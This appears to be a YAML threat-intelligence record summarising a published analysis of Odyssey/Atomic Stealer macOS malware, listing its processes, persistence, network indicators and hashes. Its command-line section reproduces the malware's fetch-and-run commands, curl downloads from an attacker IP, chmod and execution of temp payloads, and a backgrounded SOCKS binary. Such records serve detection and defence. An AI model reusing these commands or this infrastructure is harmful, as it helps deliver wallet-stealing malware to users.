@@ -1,0 +1,56 @@
+description: The report details the latest version of Atomic Stealer (AMOS) and its
+  similarities to Odyssey Stealer, focusing on code-signed and notarized macOS malware.
+attribution:
+- Threat actor: Unknown
+malware_families:
+- Odyssey Stealer
+TTPs:
+  processes:
+  - Gmeet_updater.app
+  - chmod
+  - sh
+  - /tmp/CFNetworkDownload_lgg1qR.tmp
+  - /Applications/Ledger Live.app
+  - /Library/LaunchDaemons/com.{random}.plist
+  - /tmp/socks
+  commandline:
+  - chmod +x /var/folders/6y/y6cc4s9x77lfp_0dc6crzl8r0000gn/T/CFNetworkDownload_lgg1qR.tmp
+  - /bin/sh /var/folders/6y/y6cc4s9x77lfp_0dc6crzl8r0000gn/T/CFNetworkDownload_lgg1qR.tmp
+  - curl http://45.146.130.131/log -o /tmp/out.zip
+  - curl http://45.146.130.131/otherassets/ledger.zip -o /tmp/Ledger.zip
+  - /bin/sh /Applications/Ledger Live.app/Contents/MacOS/Ledger Live
+  - chmod +x /tmp/socks
+  - /tmp/socks > /dev/null 2>&1 & disown
+  powershell: []
+  scripting_engine:
+  - AppleScript
+  - SwiftUI-based application
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - hxxps://allteching.xyz/auto
+  - http://45.146.130.131/log
+  - http://45.146.130.131/otherassets/ledger.zip
+  file_activity:
+  - /var/folders/6y/y6cc4s9x77lfp_0dc6crzl8r0000gn/T/CFNetworkDownload_lgg1qR.tmp
+  - /tmp/out.zip
+  - /Applications/Ledger Live.app
+  persistence:
+  - LaunchDaemon installed in /Library/LaunchDaemons/com.{random}.plist
+  pipes: []
+  process_relations:
+  - Gmeet_updater.app -> chmod
+  - Gmeet_updater.app -> sh
+  - sh -> /tmp/CFNetworkDownload_lgg1qR.tmp
+IOCs:
+  hashes:
+  - dec750b9d596b14aeab1ed6f6d6d370022443ceceb127e7d2468b903c2d9477a
+  IPs:
+  - 45.146.130.131
+  domains:
+  - allteching.xyz
+authors:
+- Thijs Xhaflaire
+reference: https://www.jamf.com/blog/signed-and-stealing-uncovering-new-insights-on-odyssey-infostealer/
+date_of_publication: July 16, 2025
+file_creation_date: July 28, 2025
